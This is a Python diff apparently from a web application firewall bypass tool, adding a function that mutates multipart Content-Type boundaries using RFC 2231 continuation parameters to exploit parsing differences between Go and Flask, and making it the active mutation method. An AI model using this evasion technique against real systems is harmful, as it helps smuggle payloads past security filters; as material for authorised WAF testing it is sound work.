@@ -256,6 +256,36 @@ def mutant_methods_for_test_use(headers, url, method, data, files):
     return mutant_payloads
 
 
+def mutant_methods_multipart_boundary(headers, url, method, data, files):
+    """ 对 boundary 进行变异进而绕过"""
+    logger.info(TAG + "==>mutant_methods_multipart_boundary")
+    logger.debug(TAG + "==>headers: " + str(headers))
+
+    mutant_payloads = []
+    if 'Content-Type' not in headers or 'boundary' not in headers['Content-Type']:
+        return mutant_payloads
+    # 基于 RFC 2231 的boundary构造
+    boundary1 = ';boundary*0="-real-"'
+    boundary2 = ';boundary*1="boundary"'
+    headers['Content-Type'] = headers['Content-Type']+boundary1+boundary2
+
+    old_boundary = headers['Content-Type'].split('boundary')[1]
+    # 第一种是go的解析方式，第二种是flask的解析方式
+    new_boundaries = ["-real-boundary", old_boundary+"-real-boundary"]
+    for new_boundary in new_boundaries:
+        fake_data = data.replace(old_boundary, new_boundary)
+        data += fake_data
+        logger.debug(TAG + "==>data: " + data)
+        mutant_payloads.append({
+            'headers': headers,
+            'url': url,
+            'method': method,
+            'data': data,
+            'files': files
+        })
+    return mutant_payloads
+
+
 # # 通用载荷变异方法开关
 # mutant_methods_enabled = {
 #     "mutant_methods_modify_content_type": True,
@@ -286,7 +316,8 @@ def mutant_methods_for_test_use(headers, url, method, data, files):
 # mutant_methods = [mutant_methods_modify_content_type, mutant_methods_fake_content_type, mutant_methods_case_and_comment_obfuscation,
 #                   mutant_methods_url_encoding, mutant_methods_unicode_normalization, mutant_methods_line_breaks,
 #                   mutant_methods_for_test_use]
-mutant_methods = [mutant_methods_for_test_use]
+# mutant_methods = [mutant_methods_for_test_use]
+mutant_methods = [mutant_methods_multipart_boundary]
 # 上传载荷变异方法
 mutant_methods_dedicated_to_upload = []
 
